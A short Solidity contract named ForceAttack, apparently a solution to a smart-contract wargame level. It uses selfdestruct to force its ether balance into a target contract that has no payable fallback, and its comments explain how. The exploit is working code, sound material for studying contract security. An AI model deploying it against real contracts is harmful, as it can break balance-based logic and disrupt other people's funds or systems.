pragma solidity ^0.4.0;

contract ForceAttack {

    constructor () public payable {}

    //we can send all contract balance to other contract with selfdestruct
    //even that contract no fallback function payable or receive to use
    function attack(address _address) public {
        selfdestruct(_address);
    }
}